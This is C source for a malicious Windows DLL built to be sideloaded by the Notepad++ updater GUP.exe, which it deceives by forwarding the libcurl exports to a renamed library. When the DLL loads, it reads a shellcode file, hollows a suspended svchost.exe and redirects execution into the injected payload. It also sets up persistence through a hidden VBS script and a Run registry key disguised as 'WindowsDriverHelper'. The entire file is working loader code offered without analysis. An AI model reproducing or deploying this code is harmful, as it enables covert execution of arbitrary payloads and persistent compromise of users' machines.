#include "pch.h"
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

// Export libcurl functions to impersonate or bypass DLL dependency checks
#pragma comment(linker, "/export:curl_easy_cleanup=gup.curl_easy_cleanup,@1")
#pragma comment(linker, "/export:curl_easy_init=gup.curl_easy_init,@6")
#pragma comment(linker, "/export:curl_easy_perform=gup.curl_easy_perform,@12")
#pragma comment(linker, "/export:curl_easy_setopt=gup.curl_easy_setopt,@16")

DWORD WINAPI DoMagic(LPVOID lpParameter)
{
    FILE* fp;
    size_t size;
    unsigned char* buffer;

    // Read the payload binary file
    fp = fopen("gup-payload.bin", "rb");
    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    buffer = (unsigned char*)malloc(size);
    fread(buffer, size, 1, fp);
    fclose(fp);

    // Create a suspended legitimate process (svchost.exe)
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    BOOL success = CreateProcessA(
        "C:\\Windows\\System32\\svchost.exe", // Target legitimate process
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, // Start in suspended state
        NULL, NULL, &si, &pi
    );

    if (!success) return 1;

    // Allocate memory in the remote process and write the payload
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remoteMem, buffer, size, NULL);

    // Modify the execution context to jump to the injected shellcode
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

#ifdef _WIN64
    ctx.Rip = (DWORD64)remoteMem; 
#else
    ctx.Eip = (DWORD)remoteMem;   
#endif

    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread); 

    // === CREATE VBS SCRIPT FOR PERSISTENCE ===
    char vbsPath[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", vbsPath, MAX_PATH);  
    strcat(vbsPath, "\\update.vbs"); 

    // Create the VBS script to silently run GUP.exe
    FILE* vbsFile = fopen(vbsPath, "w");
    if (vbsFile) {
        fprintf(vbsFile,
            "Set WshShell = CreateObject(\"WScript.Shell\")\n"
            "WshShell.Run \"\"\"C:\\Program Files\\Notepad++\\updater\\GUP.exe\"\"\", 0, False\n"
        );
        fclose(vbsFile);
    }

    // Add registry entry for persistence on user login
    // Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
    {
        RegSetValueExA(hKey, "WindowsDriverHelper", 0, REG_SZ, (const BYTE*)vbsPath, (DWORD)strlen(vbsPath) + 1);
        RegCloseKey(hKey);
    }

    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
        CloseHandle(threadHandle);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
